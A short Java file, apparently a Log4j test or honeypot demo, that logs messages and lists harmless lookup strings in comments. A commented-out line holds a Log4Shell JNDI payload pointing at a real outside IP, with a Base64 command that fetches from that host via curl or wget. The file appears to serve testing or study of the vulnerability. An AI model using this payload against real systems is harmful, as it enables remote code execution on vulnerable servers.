package com.mkyong;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class HelloWorld {
    private static final Logger logger = LogManager.getLogger(HelloWorld.class);

    public static void main(String[] args) {
        /* Run honeypot*/
	
    	/*
         * StrSubstitute strings to test 
         * ${env:USER}
         * ${sys:os.name}
         * ${sys:os.version}
         */
        
	System.out.println("This is before from println");
        logger.info("This is before from log4j");
        //logger.info("${jndi:ldap://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xOTIuMTY1LjI0NC4xNDM6NDQzfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE5Mi4xNjUuMjQ0LjE0Mzo0NDMpfGVjaG8=}");
        logger.info("This is after from log4j");
        System.out.println("This is after from println");

    }

}
